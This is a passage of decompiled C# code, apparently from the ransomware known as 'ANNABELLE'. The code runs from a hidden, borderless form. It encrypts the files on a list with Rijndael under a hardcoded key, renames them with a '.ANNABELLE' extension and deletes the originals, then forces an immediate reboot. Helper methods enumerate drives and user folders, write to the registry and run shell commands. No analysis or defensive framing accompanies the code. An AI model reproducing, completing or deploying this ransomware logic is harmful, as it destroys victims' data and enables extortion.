				array4[num3 - 32] = array3[num3];
				num3++;
			}
			while (num3 <= 47);
			return array4;
		}
	}

	public void method_52(string string_5, string string_6, byte[] byte_0, byte[] byte_1, GEnum0 genum0_0)
	{
		checked
		{
			try
			{
				fileStream_0 = Form1.smethod_60(string_5, FileMode.Open, FileAccess.Read);
				fileStream_1 = Form1.smethod_60(string_6, FileMode.OpenOrCreate, FileAccess.Write);
				Form1.smethod_61(fileStream_1, 0L);
				byte[] byte_2 = new byte[4097];
				long num = 0L;
				long num2 = Form1.smethod_62(fileStream_0);
				RijndaelManaged rijndaelManaged_ = Form1.smethod_63();
				Form1.smethod_64(pbstatus, 0);
				Form1.smethod_65(pbstatus, 100);
				CryptoStream cryptoStream = default(CryptoStream);
				switch (genum0_0)
				{
				case GEnum0.ActionEncrypt:
					cryptoStream = Form1.smethod_67((Stream)fileStream_1, Form1.smethod_66(rijndaelManaged_, byte_0, byte_1), CryptoStreamMode.Write);
					break;
				case GEnum0.ActionDecrypt:
					cryptoStream = Form1.smethod_67((Stream)fileStream_1, Form1.smethod_68(rijndaelManaged_, byte_0, byte_1), CryptoStreamMode.Write);
					break;
				}
				while (num < num2)
				{
					int num3 = Form1.smethod_69(fileStream_0, byte_2, 0, 4096);
					Form1.smethod_70(cryptoStream, byte_2, 0, num3);
					num += num3;
					Form1.smethod_64(pbstatus, (int)Form1.smethod_71((double)num / (double)num2 * 100.0));
				}
				Form1.smethod_72((Stream)cryptoStream);
				Form1.smethod_72((Stream)fileStream_0);
				Form1.smethod_72((Stream)fileStream_1);
				if (genum0_0 == GEnum0.ActionEncrypt)
				{
					FileInfo fileInfo_ = Form1.smethod_73(string_1);
					Form1.smethod_74(fileInfo_);
				}
				if (genum0_0 == GEnum0.ActionDecrypt)
				{
					FileInfo fileInfo_2 = Form1.smethod_73(string_2);
					Form1.smethod_74(fileInfo_2);
				}
			}
			catch (Exception exception_)
			{
				Form1.smethod_22(exception_);
				Form1.smethod_72((Stream)fileStream_0);
				Form1.smethod_72((Stream)fileStream_1);
				if (genum0_0 != GEnum0.ActionDecrypt)
				{
					FileInfo fileInfo_3 = Form1.smethod_73(string_0);
					Form1.smethod_74(fileInfo_3);
				}
				else
				{
					FileInfo fileInfo_4 = Form1.smethod_73(string_0);
					Form1.smethod_74(fileInfo_4);
				}
				Form1.smethod_23();
			}
		}
	}

	private void method_53(object sender, EventArgs e)
	{
		Form1.smethod_65(ProgressBar1, Form1.smethod_75(Form1.smethod_47(ListBox1)));
		if (Form1.smethod_76(ProgressBar1) == Form1.smethod_75(Form1.smethod_47(ListBox1)))
		{
			Form1.smethod_77((Form)(object)this, bool_0: false);
			Form1.smethod_78((Form)(object)this, (FormWindowState)1);
			Form1.smethod_79(Timer_0);
			Form1.smethod_80(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), "C:\\Save1.txt", "Save", bool_0: true);
			Form1.smethod_81("shutdown", "-r -t 00 -f");
			return;
		}
		Form1.smethod_82(ListBox1, Form1.smethod_76(ProgressBar1));
		Form1.smethod_83(ListBox1, (SelectionMode)1);
		string_0 = Form1.smethod_85(Form1.smethod_84(ListBox1));
		try
		{
			byte[] byte_ = method_50("u8gPA4uY6w5CMCgw");
			byte[] byte_2 = method_51("u8gPA4uY6w5CMCgw");
			method_52(string_0, Form1.smethod_14(string_0, ".ANNABELLE"), byte_, byte_2, GEnum0.ActionEncrypt);
		}
		catch (Exception exception_)
		{
			Form1.smethod_22(exception_);
			Form1.smethod_23();
		}
		Form1.smethod_86(ProgressBar1, 1);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool SendNotifyMessage(IntPtr intptr_1, uint uint_0, UIntPtr uintptr_0, IntPtr intptr_2);

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				Form1.smethod_50((IDisposable)icontainer_0);
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0194: Expected O, but got Unknown
		icontainer_0 = Form1.smethod_87();
		ComponentResourceManager componentResourceManager = Form1.smethod_89(Form1.smethod_88(typeof(Form1).TypeHandle));
		ProgressBar1 = Form1.smethod_90();
		pbstatus = Form1.smethod_90();
		ListBox1 = Form1.smethod_91();
		Timer_0 = Form1.smethod_92(icontainer_0);
		Form1.smethod_93((Control)(object)this);
		((Control)ProgressBar1).set_Location(new Point(326, 28));
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(10, 10));
		((Control)ProgressBar1).set_TabIndex(4);
		((Control)ProgressBar1).set_Visible(false);
		((Control)pbstatus).set_Location(new Point(326, 12));
		((Control)pbstatus).set_Name("pbstatus");
		((Control)pbstatus).set_Size(new Size(10, 10));
		((Control)pbstatus).set_TabIndex(5);
		((Control)pbstatus).set_Visible(false);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		((Control)ListBox1).set_Location(new Point(326, 44));
		((Control)ListBox1).set_Name("ListBox1");
		((Control)ListBox1).set_Size(new Size(10, 4));
		((Control)ListBox1).set_TabIndex(6);
		((Control)ListBox1).set_Visible(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).get_Controls().Add((Control)(object)pbstatus);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	static void smethod_1(Form form_0, FormClosingEventHandler formClosingEventHandler_0)
	{
		form_0.add_FormClosing(formClosingEventHandler_0);
	}

	static void smethod_2(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_3(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static int smethod_4(CreateParams createParams_0)
	{
		return createParams_0.get_ClassStyle();
	}

	static void smethod_5(CreateParams createParams_0, int int_1)
	{
		createParams_0.set_ClassStyle(int_1);
	}

	static FileSystemProxy smethod_6(ServerComputer serverComputer_0)
	{
		return serverComputer_0.get_FileSystem();
	}

	static void smethod_7(FileSystemProxy fileSystemProxy_0, string string_5, byte[] byte_0, bool bool_0)
	{
		fileSystemProxy_0.WriteAllBytes(string_5, byte_0, bool_0);
	}

	static CloseReason smethod_8(FormClosingEventArgs formClosingEventArgs_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return formClosingEventArgs_0.get_CloseReason();
	}

	static void smethod_9(CancelEventArgs cancelEventArgs_0, bool bool_0)
	{
		cancelEventArgs_0.Cancel = bool_0;
	}

	static SpecialDirectoriesProxy smethod_10(FileSystemProxy fileSystemProxy_0)
	{
		return fileSystemProxy_0.get_SpecialDirectories();
	}

	static string smethod_11(SpecialDirectoriesProxy specialDirectoriesProxy_0)
	{
		return specialDirectoriesProxy_0.get_ProgramFiles();
	}

	static string[] smethod_12()
	{
		return Directory.GetLogicalDrives();
	}

	static string smethod_13()
	{
		return Application.get_ExecutablePath();
	}

	static string smethod_14(string string_5, string string_6)
	{
		return string_5 + string_6;
	}

	static void smethod_15(string string_5, string string_6)
	{
		File.Copy(string_5, string_6);
	}

	static StreamWriter smethod_16(string string_5)
	{
		return new StreamWriter(string_5);
	}

	static void smethod_17(TextWriter textWriter_0, string string_5)
	{
		textWriter_0.WriteLine(string_5);
	}

	static string smethod_18(string string_5, string string_6, string string_7)
	{
		return string_5 + string_6 + string_7;
	}

	static void smethod_19(TextWriter textWriter_0, string string_5, object object_0)
	{
		textWriter_0.WriteLine(string_5, object_0);
	}

	static void smethod_20(StreamWriter streamWriter_0)
	{
		streamWriter_0.Close();
	}

	static void smethod_21(string string_5, FileAttributes fileAttributes_0)
	{
		File.SetAttributes(string_5, fileAttributes_0);
	}

	static void smethod_22(Exception exception_0)
	{
		ProjectData.SetProjectError(exception_0);
	}

	static void smethod_23()
	{
		ProjectData.ClearProjectError();
	}

	static bool smethod_24(string string_5)
	{
		return File.Exists(string_5);
	}

	static void smethod_25(Form form_0)
	{
		form_0.Close();
	}

	static void smethod_26(Control control_0)
	{
		control_0.Hide();
	}

	static void smethod_27(Control control_0)
	{
		control_0.Show();
	}

	static bool smethod_28()
	{
		return Environment.Is64BitOperatingSystem;
	}

	static DialogResult smethod_29(string string_5, string string_6, MessageBoxButtons messageBoxButtons_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(string_5, string_6, messageBoxButtons_0);
	}

	static MsgBoxResult smethod_30(object object_0, MsgBoxStyle msgBoxStyle_0, object object_1)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		return Interaction.MsgBox(object_0, msgBoxStyle_0, object_1);
	}

	static RegistryProxy smethod_31(ServerComputer serverComputer_0)
	{
		return serverComputer_0.get_Registry();
	}

	static RegistryKey smethod_32(RegistryProxy registryProxy_0)
	{
		return registryProxy_0.get_LocalMachine();
	}

	static RegistryKey smethod_33(RegistryKey registryKey_0, string string_5, bool bool_0)
	{
		return registryKey_0.OpenSubKey(string_5, bool_0);
	}

	static string smethod_34()
	{
		return Application.get_ProductName();
	}

	static void smethod_35(RegistryKey registryKey_0, string string_5, object object_0)
	{
		registryKey_0.SetValue(string_5, object_0);
	}

	static RegistryKey smethod_36(RegistryProxy registryProxy_0)
	{
		return registryProxy_0.get_CurrentUser();
	}

	static int smethod_37(string string_5, AppWinStyle appWinStyle_0, bool bool_0, int int_1)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return Interaction.Shell(string_5, appWinStyle_0, bool_0, int_1);
	}

	static object smethod_38(string string_5, string string_6)
	{
		return Interaction.CreateObject(string_5, string_6);
	}

	static object smethod_39(object object_0)
	{
		return RuntimeHelpers.GetObjectValue(object_0);
	}

	static object smethod_40(object object_0, Type type_0, string string_5, object[] object_1, string[] string_6, Type[] type_1, bool[] bool_0, bool bool_1)
	{
		return NewLateBinding.LateCall(object_0, type_0, string_5, object_1, string_6, type_1, bool_0, bool_1);
	}

	static RegistryKey smethod_41(RegistryKey registryKey_0, string string_5, RegistryKeyPermissionCheck registryKeyPermissionCheck_0)
	{
		return registryKey_0.CreateSubKey(string_5, registryKeyPermissionCheck_0);
	}

	static void smethod_42(RegistryKey registryKey_0)
	{
		registryKey_0.Close();
	}

	static string smethod_43(SpecialDirectoriesProxy specialDirectoriesProxy_0)
	{
		return specialDirectoriesProxy_0.get_MyDocuments();
	}

	static ReadOnlyCollection<string> smethod_44(FileSystemProxy fileSystemProxy_0, string string_5, SearchOption searchOption_0, string[] string_6)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		return fileSystemProxy_0.GetDirectories(string_5, searchOption_0, string_6);
	}

	static ReadOnlyCollection<string> smethod_45(FileSystemProxy fileSystemProxy_0, string string_5)
	{
		return fileSystemProxy_0.GetFiles(string_5);
	}

	static bool smethod_46(string string_5, string string_6)
	{
		return string_5.EndsWith(string_6);
	}

	static ObjectCollection smethod_47(ListBox listBox_0)
	{
		return listBox_0.get_Items();
	}

	static int smethod_48(ObjectCollection objectCollection_0, object object_0)
	{
		return objectCollection_0.Add(object_0);
	}

	static bool smethod_49(IEnumerator ienumerator_0)
	{
		return ienumerator_0.MoveNext();
	}

	static void smethod_50(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static string smethod_51(SpecialDirectoriesProxy specialDirectoriesProxy_0)
	{
		return specialDirectoriesProxy_0.get_MyMusic();
	}

	static string smethod_52(SpecialDirectoriesProxy specialDirectoriesProxy_0)
	{
		return specialDirectoriesProxy_0.get_MyPictures();
	}

	static string smethod_53()
	{
		return Environment.UserName;
	}

	static void smethod_54(Timer timer_1)
	{
		timer_1.Start();
	}

	static char[] smethod_55(string string_5)
	{
		return string_5.ToCharArray();
	}

	static int smethod_56(Array array_0, int int_1)
	{
		return array_0.GetUpperBound(int_1);
	}

	static int smethod_57(char char_0)
	{
		return Strings.Asc(char_0);
	}

	static SHA512Managed smethod_58()
	{
		return new SHA512Managed();
	}

	static byte[] smethod_59(HashAlgorithm hashAlgorithm_0, byte[] byte_0)
	{
		return hashAlgorithm_0.ComputeHash(byte_0);
	}

	static FileStream smethod_60(string string_5, FileMode fileMode_0, FileAccess fileAccess_0)
	{
		return new FileStream(string_5, fileMode_0, fileAccess_0);
	}

	static void smethod_61(FileStream fileStream_2, long long_0)
	{
		fileStream_2.SetLength(long_0);
	}

	static long smethod_62(FileStream fileStream_2)
	{
		return fileStream_2.Length;
	}

	static RijndaelManaged smethod_63()
	{
		return new RijndaelManaged();
	}

	static void smethod_64(ProgressBar progressBar_0, int int_1)
	{
		progressBar_0.set_Value(int_1);
	}

	static void smethod_65(ProgressBar progressBar_0, int int_1)
	{
		progressBar_0.set_Maximum(int_1);
	}

	static ICryptoTransform smethod_66(RijndaelManaged rijndaelManaged_0, byte[] byte_0, byte[] byte_1)
	{
		return rijndaelManaged_0.CreateEncryptor(byte_0, byte_1);
	}

	static CryptoStream smethod_67(Stream stream_0, ICryptoTransform icryptoTransform_0, CryptoStreamMode cryptoStreamMode_0)
	{
		return new CryptoStream(stream_0, icryptoTransform_0, cryptoStreamMode_0);
	}

	static ICryptoTransform smethod_68(RijndaelManaged rijndaelManaged_0, byte[] byte_0, byte[] byte_1)
	{
		return rijndaelManaged_0.CreateDecryptor(byte_0, byte_1);
	}

	static int smethod_69(FileStream fileStream_2, byte[] byte_0, int int_1, int int_2)
	{
		return fileStream_2.Read(byte_0, int_1, int_2);
	}

	static void smethod_70(CryptoStream cryptoStream_0, byte[] byte_0, int int_1, int int_2)
	{
		cryptoStream_0.Write(byte_0, int_1, int_2);
	}

	static double smethod_71(double double_0)
	{
		return Math.Round(double_0);
	}

	static void smethod_72(Stream stream_0)
	{
		stream_0.Close();
	}

	static FileInfo smethod_73(string string_5)
	{
		return new FileInfo(string_5);
	}

	static void smethod_74(FileInfo fileInfo_0)
	{
		fileInfo_0.Delete();
	}

	static int smethod_75(ObjectCollection objectCollection_0)
	{
		return objectCollection_0.get_Count();
	}

	static int smethod_76(ProgressBar progressBar_0)
	{
		return progressBar_0.get_Value();
	}

	static void smethod_77(Form form_0, bool bool_0)
	{
		form_0.set_ShowInTaskbar(bool_0);
	}

	static void smethod_78(Form form_0, FormWindowState formWindowState_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_WindowState(formWindowState_0);
	}

	static void smethod_79(Timer timer_1)
	{
		timer_1.Stop();
	}

	static void smethod_80(FileSystemProxy fileSystemProxy_0, string string_5, string string_6, bool bool_0)
	{
		fileSystemProxy_0.WriteAllText(string_5, string_6, bool_0);
	}

	static Process smethod_81(string string_5, string string_6)
	{
		return Process.Start(string_5, string_6);
	}

	static void smethod_82(ListBox listBox_0, int int_1)
	{
		listBox_0.set_SelectedIndex(int_1);
	}

	static void smethod_83(ListBox listBox_0, SelectionMode selectionMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		listBox_0.set_SelectionMode(selectionMode_0);
	}

	static object smethod_84(ListBox listBox_0)
	{
		return listBox_0.get_SelectedItem();
	}

	static string smethod_85(object object_0)
	{
		return Conversions.ToString(object_0);
	}

	static void smethod_86(ProgressBar progressBar_0, int int_1)
	{
		progressBar_0.Increment(int_1);
	}

	static Container smethod_87()
	{
		return new Container();
	}

	static Type smethod_88(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static ComponentResourceManager smethod_89(Type type_0)
	{
		return new ComponentResourceManager(type_0);
	}

	static ProgressBar smethod_90()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ProgressBar();
	}

	static ListBox smethod_91()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ListBox();
	}

	static Timer smethod_92(IContainer icontainer_1)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_1);
	}

	static void smethod_93(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_94(Timer timer_1, EventHandler eventHandler_0)
	{
		timer_1.remove_Tick(eventHandler_0);
	}

	static void smethod_95(Timer timer_1, EventHandler eventHandler_0)
	{
		timer_1.add_Tick(eventHandler_0);
	}
}
